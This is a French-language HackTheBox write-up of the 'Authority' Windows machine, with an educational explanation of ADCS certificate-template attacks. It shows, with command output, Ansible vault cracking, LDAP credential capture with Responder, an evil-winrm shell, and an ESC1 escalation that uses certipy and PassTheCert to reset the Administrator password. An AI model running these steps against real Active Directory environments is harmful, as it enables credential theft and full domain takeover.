---
title: Authority - Medium (Windows)
img_path: "/assets/img/posts/authority"
categories:
- Write-up
- HackTheBox
- Windows
tags:
- windows
- htb
- vulnérabilités
- ansible
- ADCD
- certified-pre-owned
---

![Authority](Authority.png)

------------------------------------------------------------------------
## User
------------------------------------------------------------------------
### Nmap

```bash
└─$ sudo nmap -sS -p- -PN -O 10.129.213.140
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-20 10:13 EDT
Nmap scan report for authority.htb (10.129.213.140)
Host is up (0.14s latency).
Not shown: 65506 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8443/tcp  open  https-alt
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49675/tcp open  unknown
49678/tcp open  unknown
49687/tcp open  unknown
49698/tcp open  unknown
49709/tcp open  unknown
53999/tcp open  unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=7/20%OT=53%CT=1%CU=41434%PV=Y%DS=2%DC=I%G=Y%TM=64B945E
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=FA%GCD=1%ISR=10F%TI=I%CI=I%II=I%SS=S%TS=U
OS:)OPS(O1=M53ANW8NNS%O2=M53ANW8NNS%O3=M53ANW8%O4=M53ANW8NNS%O5=M53ANW8NNS%
OS:O6=M53ANNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%D
OS:F=Y%T=80%W=FFFF%O=M53ANW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0
OS:%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=
OS:Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R
OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=
OS:80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z
OS:)

Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1273.73 seconds

```

Nous avons affaires de façon évidente avec un Active Directory. On retrouve ici différents services exposés. 

### Énumération de LDAP :

```bash
└─$ nmap -n -sV --script "ldap* and not brute" -p 389 10.129.213.140
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-20 10:44 EDT
Nmap scan report for 10.129.213.140
Host is up (0.15s latency).

PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=authority,DC=htb
|       ldapServiceName: authority.htb:authority$@AUTHORITY.HTB
<SNIP>
CN=Aggregate,CN=Schema,CN=Configuration,DC=authority,DC=htb
|       serverName: CN=AUTHORITY,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=authority,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=authority,DC=htb
|       namingContexts: DC=authority,DC=htb
|       namingContexts: CN=Configuration,DC=authority,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=authority,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=authority,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=authority,DC=htb
|       isSynchronized: TRUE
|       highestCommittedUSN: 266436
|       dsServiceName: CN=NTDS Settings,CN=AUTHORITY,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=authority,DC=htb
|       dnsHostName: authority.authority.htb
|       defaultNamingContext: DC=authority,DC=htb
|       currentTime: 20230720184443.0Z
|_      configurationNamingContext: CN=Configuration,DC=authority,DC=htb
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.89 seconds
```

Il ne semble rien y avoir de très intéressant, si ce n'est les différents contextes.

### enum4linux 

```bash
└─$ enum4linux -a -u "guest" -p '' 10.129.213.140 
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jul 20 10:31:04 2023

 =========================================( Target Information )=========================================

Target ........... 10.129.213.140
RID Range ........ 500-550,1000-1050
Username ......... 'guest'
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
<SNIP>
 ================================( Share Enumeration on 10.129.213.140 )================================

do_connect: Connection to 10.129.213.140 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Department Shares Disk      
	Development     Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.129.213.140

//10.129.213.140/ADMIN$	Mapping: DENIED Listing: N/A Writing: N/A
//10.129.213.140/C$	Mapping: DENIED Listing: N/A Writing: N/A
//10.129.213.140/Department Shares	Mapping: OK Listing: DENIED Writing: N/A
//10.129.213.140/Development	Mapping: OK Listing: OK Writing: N/A

[E] Can t understand response:

NT_STATUS_NO_SUCH_FILE listing \*
//10.129.213.140/IPC$	Mapping: N/A Listing: N/A Writing: N/A
//10.129.213.140/NETLOGON	Mapping: OK Listing: DENIED Writing: N/A
//10.129.213.140/SYSVOL	Mapping: OK Listing: DENIED Writing: N/A
<SNIP>
enum4linux complete on Thu Jul 20 10:48:54 2023
```

Nous voyons les dossiers partagés par smb. Nous avons la possibilité en tant que guest de seulement lister le dossier /Devlopment, auquel nous allons nous connecter afin de déterminer ce qu'il contient.

### Devlopment


```bash
└─$ smbclient \\\\10.129.213.140\\Development 
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

On  se retrouve avec un dossier intitulé "Automation".

Regardons ce qui se trouve dedans.

On trouve tout un tas de fichier liés à ansible.

Il y a plein de user et mots de passe, mais rien qui semble exploitable.

Cependant, dans un fichier lié à pwm, un gestionnaire de mot de passe, il y a trois choses :

```yaml
pwm_run_dir: "{ { lookup('env', 'PWD') } }"
pwm_hostname: authority.htb.corp
pwm_http_port: "{ { http_port } }"
pwm_https_port: "{ { https_port } }"
pwm_https_enable: true
pwm_require_ssl: false
pwm_admin_login: !vault |
$ANSIBLE_VAULT;1.1;AES256
32666534386435366537653136663731633138616264323230383566333966346662313161326239
6134353663663462373265633832356663356239383039640a346431373431666433343434366139
35653634376333666234613466396534343030656165396464323564373334616262613439343033
6334326263326364380a653034313733326639323433626130343834663538326439636232306531
3438
pwm_admin_password: !vault |
$ANSIBLE_VAULT;1.1;AES256
31356338343963323063373435363261323563393235633365356134616261666433393263373736
3335616263326464633832376261306131303337653964350a363663623132353136346631396662
38656432323830393339336231373637303535613636646561653637386634613862316638353530
3930356637306461350a316466663037303037653761323565343338653934646533663365363035
6531
ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
$ANSIBLE_VAULT;1.1;AES256
63303831303534303266356462373731393561313363313038376166336536666232626461653630
3437333035366235613437373733316635313530326639330a643034623530623439616136363563
34646237336164356438383034623462323531316333623135383134656263663266653938333334
3238343230333633350a646664396565633037333431626163306531336336326665316430613566
3764
```

On peut extraire des hashes à partir de ça via ce site par exemple : https://www.onlinehashcrack.com/tools-ansible-vault-hash-extractor.php

On peut également le faire grâce à ansible2john et ensuite cracker le hash via hascat.

Résultat :

```
$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@#$%^&*
$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&*
$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635:!@#$%^&*
```

Très étrange, mais pourquoi pas. Reste à savoir quoi faire de cela.

Il s'avère que les string contiennent et le hash qui permet de déchiffrer le login / mot de passe et le login / mot de passe en lui même.

On peut déchiffrer le tout avec ansible-vault :

```bash
└─$ ansible-vault decrypt
Vault password: 
Reading ciphertext input from stdin
$ANSIBLE_VAULT;1.1;AES256
31356338343963323063373435363261323563393235633365356134616261666433393263373736
3335616263326464633832376261306131303337653964350a363663623132353136346631396662
38656432323830393339336231373637303535613636646561653637386634613862316638353530
3930356637306461350a316466663037303037653761323565343338653934646533663365363035
6531

Decryption successful
pWm_@dm!N_!23                                                                                                                                                                                                                                               
┌──(kali㉿kali)-[/media/…/Authoriy/Automation/Ansible/LDAP]
└─$ ansible-vault decrypt
Vault password: 
Reading ciphertext input from stdin
$ANSIBLE_VAULT;1.1;AES256
32666534386435366537653136663731633138616264323230383566333966346662313161326239
6134353663663462373265633832356663356239383039640a346431373431666433343434366139
35653634376333666234613466396534343030656165396464323564373334616262613439343033
6334326263326364380a653034313733326639323433626130343834663538326439636232306531
3438
Decryption successful                                                                                                                                                     
┌──(kali㉿kali)-[/media/…/Authoriy/Automation/Ansible/LDAP]
└─$ ansible-vault decrypt
Vault password: 
Reading ciphertext input from stdin
$ANSIBLE_VAULT;1.1;AES256
63303831303534303266356462373731393561313363313038376166336536666232626461653630
3437333035366235613437373733316635313530326639330a643034623530623439616136363563
34646237336164356438383034623462323531316333623135383134656263663266653938333334
3238343230333633350a646664396565633037333431626163306531336336326665316430613566
3764
Decryption successful
DevT3st@123
```

Cela est très intéressant. Nous avons donc maintenant un login et un mot de passe, ainsi qu'un dernier mot de passe pour ldap.

Simplement, le login et le mot de passe pour pwm ne semblent pas utilisables :

![cap 1](1.png) 

On remarque qu'il y a deux autres options : 

![cap 2](2.png)

Basiquement, le configuration manager va nous permettre d'importer et d'exporter des configurations.

L'éditeur va lui nous permettre d'éditer de sauver directement la configuration.

Nous allons choisir cette dernière option, car elle est plus simple d'utilisation.

![cap 3](3.png)

On voit que dans les informations de connexion, nous avons différentes possibilités. Pour ma part, je connaissais pas, et comprends encore assez mal en étant honnête, la façon dont cela fonctionne.

Tentons premièrement de donner quelques définitions basiques.

- LDAP
	- Basiquement, LDAP est protocole pour annuaire LDAP. Il permet de traiter des données pour des services de ce type, et est très largement utilisé par les serveur windows/AD. L'utilité est de pouvoir faire des requêtes, modifier ou authentifier des objets (utilisateurs matériel etc). Pour accéder à un annuaire ldap, on doit avoir un client ldap, qui va se connecter au server via ldap ou ldaps, la version "sécurisée" de ldap.
- Active Directory
	- AD est un tel service d'annuaire. C'est un système développé par microsoft qui peut permettre de gérer des milliers d'objets. Active Directory utilise entre autre LDAP pour homogénéiser les requêtes à son annuaire.

Lorsque nous avons affaires avec un serveur ldap, l'idée est soit de trouver des informations au sein de ce serveur, soit de retrouver un mot de passe associé à ce serveur.

Ici, il semble impossible de se connecter au serveur LDAP pour une raison qui m'échappe. Le mot de passe trouvé plus haut ne fonctionne pas, et il semble que ce soit intentionnel.

Reste l'option pour dump un mot de passe / utilisateur.

Pour ce faire, nous pouvons utiliser responder. Responder est un programme qui permet de faire de nombreuse chose, et entre autre de créer un serveur ldap.

Etant donné que nous pouvons spécifier un serveur ldap dans la configuration, il devient alors très simple de faire une requête vers notre serveur :

![cap 4](4.png)

Puis avec responder (en cliquant sur Test LDAP Profile) :

```bash
└─$ sudo responder -I tun0
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

<snip>
[+] Listening for events...

[LDAP] Cleartext Client   : 10.129.161.2
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
[*] Skipping previously captured cleartext password for CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
```

Nous avons donc un mot de passe et un utilisateur, youpi !

On remarquera que mes multiples essais pour comprendre comment ça fonctionne a complètement pété le host.

```bash

┌──(kali㉿ldap)-[/media/sf_shared_folder_vm2/HTB/Boxes/Authoriy]
└─$ evil-winrm -i 10.129.161.2 -u svc_ldap -p lDaP_1n_th3_cle4r!
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_ldap\Documents>
```


------------------------------------------------------------------------
## Élévation de privilèges.
------------------------------------------------------------------------

Vient maintenant la partie la plus dure.

La machine est vulnérable à une attaque qui concerne la façon dont les certificats sont forgés par l'autorité qui s'occupe de cela : AD CD - Active Directory Certificate Delivery.

Quelques notions :

- **PKI** (Public Key Infrastructure) — Le système qui gère les clés et le chiffrement
- **AD CS** (Active Directory Certificate Services) — L'implémentation de PKI par Microsoft
- **CA** (Certificate Authority) — Le serveur PKI qui génère les certificats
- **Enterprise CA** — Un gestionnaire de certificat intégré, et qui génère des modèles (templates) de certificats utilisé pour créer des certificats.
- **Certificate Template** — Un ensemble d'options et de stratégies qui déterminent le contenu d'un certificat généré par une une "Enterprise CA"
- **CSR** (Certificate Signing Request) — Un message à un CA pour signer un certificat.
- **EKU** (Extended/Enhanced Key Usage) — un identifiant d'objet (OID) qui détermine la façon dont un certificat peut-être utilisé.

Comment fonctionne la livraison d'un certificat ?

Dans l'[excellent papier](https://posts.specterops.io/certified-pre-owned-d95910965cd2) dont sont issues la plupart des recherches sur les vulnérabilités de AD CD, on peut lire ceci :

> At a high level, clients generate a public-private key pair, and the public key is placed in a certificate signing request (CSR) message along with other details such as the subject of the certificate and the certificate template name. Clients then send the CSR to the Enterprise CA server. The CA server then checks if the client is allowed to request certificates. If so, it determines if it will issue a certificate by looking up the certificate template AD object (more on these shortly) specified in the CSR. The CA will check if the certificate template AD object’s permissions allow the authenticating account to obtain a certificate. If so, the CA generates a certificate using the “blueprint” settings defined by the certificate template (e.g., EKUs, cryptography settings, issuance requirements, etc.) and using the other information supplied in the CSR if allowed by the certificate’s template settings. The CA signs the certificate using its private key and then returns it to the client.

Pour obtenir un certificat selon un modèle précis, il faut donc avoir les droits de générer ce certificat. Si c'est le cas, le modèle sera utilisé pour générer le certificat et pourra être par la suite utilisé pour diverses actions.

Les modèles possèdent de nombreuses options.

### Template (modèle)

Un modèle est un objet Active Directory qui permet de déterminer de nombreuses choses, comme la durée de vie du certificat, l'objet de son utilisation etc.

En outre, un modèle de certificat possède l'attribut _pKIExtendedKeyUsage_ , qui est un tableau de OID, c'est à dire des identifiants d'objets, qui déterminent ce pour quoi le certificat peut être utilisé. Nous verrons ces attributs dans la section _Extended Key usage_ du modèle du certificat avec l'outil certipy.

De plus, certains de ces OID permettent de se connecter à Active Directory.

Vient en jeu un autre paramètre : les SAN.

### SAN

Les SAN pour Subject Alternative Name est une extension présente dans la RFC 5280 qui concerne la standardisation des certificats x509.

Un SAN est utile afin d'ajouter d'autres objet à un certificat donné. L'idée, c'est par exemple de permettre de rajouter plusieurs domaines dans un SAN, afin de n'avoir qu'un certificat pour de multiples domaines, empêchant par la même la multiplication des certificats pour chacun des sous-domaines.

Dans notre cas, le SAN est très intéressant : par défaut les certificats qui permettent l'authentification spécifie l'UPN (User Personal Name) pour indiquer à utiliser.

Ainsi, avec la possibilité de spécifier un UPN dans le SAN, on pourrait être en mesure de s'authentifier avec n'importe quel compte.

### ESC1

Ceci (un modèle mal configuré) est le cas le plus courant, nommé selon la nomenclature mise en place ESC1. Mais il y a 10 types d'attaques possibles - de ESC1 à ESC10.

Pour ESC1, la configuration est la suivante :

1) Le gestionnaire de certificat doit permettre à des comptes avec un faible niveau d'accès de pouvoir s'inscrire à ce certificat.
2) Il ne doit pas y avoir une approbation d'un administrateur (muni des droits nécessaires à) pour la génération du certificat
3) Aucune signature n'est requise (voir plus haut **CSR**)
4) Il existe une possibilité d'inscription pour des comptes avec des faibles privilèges
5) Il y a la présence d'un des EKU suivants : **Client Authentication**, **PKINIT Client Authentication**, **Smart Card Logon**, **Any Purpose** ou bien pas d'EKU de déterminé.
6) On doit pouvoir spécifier un SAN dans le CSR afin de pouvoir s'authentifier via l'UPN spécifié

À la fin de ce write-up sont listés les autres types de vulnérabilités.

### ESC1 sur le serveur

De notre côté, on peut utiliser certipy pour remarquer que le serveur est effectivement vulnérable à une attaque de type ESC1 :

```bash
certipy find -u 'svc_ldap@authority.htb' -p 'lDaP_1n_th3_cle4r!' -dc-ip '10.129.161.2' -vulnerable -stdout
Certipy v4.7.0 - by Oliver Lyak (ly4k)

<SNIP>
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollmentCheckUserDsCertificate
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Property Principals       : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

Nous pouvons voir plusieurs choses :
 - L'autorité qui génère les certificats est **AUTHORITY-CA** (authority.authority.htb\\**AUTHORITY-CA**)
 - Il existe un template nommé **CorpVPN**
 - Ce modèle est vulnérable à une attaque de type ESC1 (mauvaise configuration du modèle) via 'AUTHORITY.HTB\\Domain Computers', qui est un groupe présent par défaut dans AD.


Plus précisément, ce template permet aux ordinateur du groupe AUTHORITY.HTB\\Domain Computers de s'inscrire à ce certificat. En outre, le certificat permet diverses choses, qu'on peut voir dans la section _Extended Key Usage_ :
- Encrypting File System : permet de chiffrer des données à l'aide d'EFS de windows
- Secure Email : le certificat peut-être utilisé pour chiffrer des emails.
- **Client Authentication** : le certificat permet de s'authentifier en tant qu'un utilisateur
- Document Signing : le certificat peut permettre de signer un document
- IP security IKE intermediate : concerne une sombre histoire IpSec
- IP security use : concerne une sombre histoire IpSec
- KDC Authentication : le certificat peut être utilisé pour s'authentifier auprès du Key Distribution Center dans les environnements Kerberos.

On retrouve ici une des conditions requises pour la vulnérabilité de type ESC1 : la présence de l'EKU **Client Authentication**.

On remarque également qu'il n'y a pas besoin de l'approbation d'un administrateur, qu'aucune signature n'est requise, que des comptes avec un accès faible peuvent s'inscrire au certificat (via le groupe Domain Computer, on expliquera ça plus bas), que le flag _Enrollee Supplies Subject_ est à _true_.

Voici l'objet authority-ca vu dans le [fork de bloodhound](https://github.com/ly4k/BloodHound) :

![cap 5](5.png)

### Exploitation

Le groupe Domain Computer est automatiquement rejoint dès lors qu'un ordinateur est créé. Cela veut dire que **si nous sommes en capacité de créer un ordinateur, nous avons la possibilité de l'utiliser afin de générer un certificat avec les droits de administrator@authority.htb !**

Ceci est dû au fait que les objets d'un groupe héritent des propriétés de ce groupe, et que le certificat permet au demandeur de spécifier un SAN (ici administrator@authority.htb), ainsi que d'utiliser ledit certificat afin de s'authentifier.

1) **Ajout d'un compte machine**

Pour pouvoir ajouter un ordinateur, il faut avoir le privilège SeMachineAccountPrivilege. Ce privilège est de façon générale très dangereux.

```powershell
(Get-DomainPolicy -Policy DC).PrivilegeRights.SeMachineAccountPrivilege.Trim("*") | Get-DomainObject | Select-Object name

Get-DomainObject | Where-Object ms-ds-machineaccountquota

crackmapexec ldap <DC FQDN> -d <DOMAIN> -u <USER> -p <PASS> -M maq
```

Nous avons ce privilège.

Pour ajouter un compte machine, il y a plusieurs façons.

De mon côté, j'ai utilisé le script powermad. On peut aussi utiliser tout simplement impacket et son script addcomputer.py.

```powershell
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> New-MachineAccount -MachineAccount titi -Password $(ConvertTo-SecureString
 'Password123' -AsPlainText -Force)
[+] Machine account titi added
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> Get-ADComputer -identity titi


DistinguishedName : CN=titi,CN=Computers,DC=authority,DC=htb
DNSHostName       : titi.authority.htb
Enabled           : True
Name              : titi
ObjectClass       : computer
ObjectGUID        : 10fe6603-5b9d-4cdd-acf0-aaad30da3809
SamAccountName    : titi$
SID               : S-1-5-21-622327497-3269355298-2248959698-12104
UserPrincipalName :
```

2) **Génération du certificat avec certipy**

```bash
┌──(kali㉿ldap)-[/media/sf_shared_folder_vm2/HTB/Boxes/Authoriy]
└─$ certipy req -u titi$ -p Password123 -template CorpVPN -dc-ip 10.129.161.2 -ca authority-ca -target authority.htb -upn administrator@authority.htb
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 31
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Le certificat a bien été généré !!

3) **Authentification**
Avec certipy :
```bash
┌──(kali㉿ldap)-[/media/sf_shared_folder_vm2/HTB/Boxes/Authoriy]
└─$ certipy auth -pfx ./administrator.pfx -dc-ip 10.129.161.2 
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@authority.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```

Cela ne fonctionne pas ! :-(

Pourquoi ? Dans un [autre post des chercheurs](https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d), il est indiqué que cette erreur est possible pour les raisons suivantes :

> “[_…when a domain controller doesn’t have a certificate installed for smart cards…_](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771)” is probably the most common reason for KDC_ERR_PADATA_TYPE_NOSUPP. If the DC doesn’t have a “Domain Controller”, “Domain Controller Authentication”, or another certificate with the **Server Authentication** EKU (OID 1.3.6.1.5.5.7.3.1) installed, the DC isn’t properly set up for PKINIT and authentication will fail.
>Also, according to Microsoft, “[_This problem can happen because the wrong certification authority (CA) is being queried or the proper CA cannot be contacted in order to get Domain Controller or Domain Controller Authentication certificates for the domain controller._](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771)” At least in some cases we’ve been able to auth via PKINIT to a DC even when the CA is not reachable, so this situation may be hit and miss.
> If you run into a situation where you can enroll in a vulnerable certificate template but the resulting certificate fails for Kerberos authentication, you can try authenticating to LDAP via SChannel using something like [PassTheCert](https://github.com/AlmondOffSec/PassTheCert). You will only have LDAP access, but this should be enough if you have a certificate stating you’re a domain admin.

Il semble donc que pour une raison ou une autre (un serveur kerberos absent ou non configuré par exemple), le contrôleur de domaine ne soit pas en mesure de prendre en charge le certificat.

Cependant, le certificat lui reste toujours valide (et pendant 20 ans selon le template ! :D ).

Nous allons donc l'utiliser via le programme [passthecert](https://github.com/AlmondOffSec/PassTheCert/tree/main/Python), qui va nous permettre de faire différentes actions avec le certificat.

Notamment, changer le mot de passe de Administrator... 

```bash
──(kali㉿ldap)-[/media/sf_shared_folder_vm2/HTB/Boxes/Authoriy]
└─$ certipy cert -pfx ./administrator.pfx -nokey -out admin.crt                      
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to 'admin.crt'
                                                                                                                       
┌──(kali㉿ldap)-[/media/sf_shared_folder_vm2/HTB/Boxes/Authoriy]
└─$ certipy cert -pfx ./administrator.pfx -nocert -out admin.key
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Writing private key to 'admin.key'
                                                                                                                       
└─$ python3 passthecert.py -action modify_user -crt admin.crt -key admin.key -domain authority.htb -dc-ip 10.129.161.2 -target Administrator -new-pass

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Successfully changed Administrator password to: bbp4P5cCIKgpwdHuNVxWpiUEqaOLEVnE
                                                                                                                       
┌──(kali㉿ldap)-[/media/sf_shared_folder_vm2/HTB/Boxes/Authoriy]
└─$ evil-winrm -i 10.129.161.2 -u Administrator -p bbp4P5cCIKgpwdHuNVxWpiUEqaOLEVnE
                                        
Evil-WinRM shell v3.5
                                        
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls


    Directory: C:\Users\Administrator\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         8/9/2022   2:18 PM                WindowsPowerShell
```

Et voilà, la box est terminée !

------------------------------------------------------------------------
## Les autres vulnérabilités ESCX
------------------------------------------------------------------------

Nous avons vu en détail la vulnérabilité de type ESC1. Voici une vue générale des autres vulnérabilités telles que décrites dans le papier de recherche.

### ESC2

- L'autorité de certification d'entreprise accorde des droits d'inscription aux utilisateurs avec de faibles privilèges. Les détails sont les mêmes que dans ESC1. 
- L'approbation du responsable est désactivée. Les détails sont les mêmes que dans ESC1. 
- Aucune signature autorisée n'est requise. Les détails sont les mêmes que dans ESC1. 
- Un descripteur de sécurité de modèle de certificat trop permissif accorde des droits d'inscription de certificat aux utilisateurs à faibles privilèges. Les détails sont les mêmes que dans ESC1. 
- Le modèle de certificat définit les EKU tout usage ou aucune EKU.

### ESC3

- L'autorité de certification accorde des droits d'inscription aux utilisateurs à faibles privilèges. (voir ESC1)
- L'approbation du responsable est désactivée. (voir ESC1)
- Aucune signature autorisée n'est requise. (voir ESC1)
- Un descripteur de sécurité de modèle de certificat trop permissif accorde des droits d'inscription de certificat aux utilisateurs à faibles privilèges. (voir ESC1)
- Le modèle de certificat définit l'EKU **Certificate Request Agent**. Il permet de demander d'autres modèles de certificat au nom d'autres mandants. 
- Les restrictions d'agent d'inscription ne sont pas implémentées sur l'autorité de certification.

Cette vulnérabilité est difficile à comprendre pour ma part (ce write-up ne constitue pas une somme sur le sujet, mais une tentative de compréhension).

De ce que j'ai pu saisir, si un utilisateur peut s'inscrire à un template contenant l'EKU Certificate Agent request, il est en capacité de le faire en tant que n'importe quel utilisateur pour des certificats de version 1 (c'est à dire des certificats qui suivent la [RFC 1422](https://datatracker.ietf.org/doc/html/rfc1422)), un modèle obsolète, ou de version 2+.

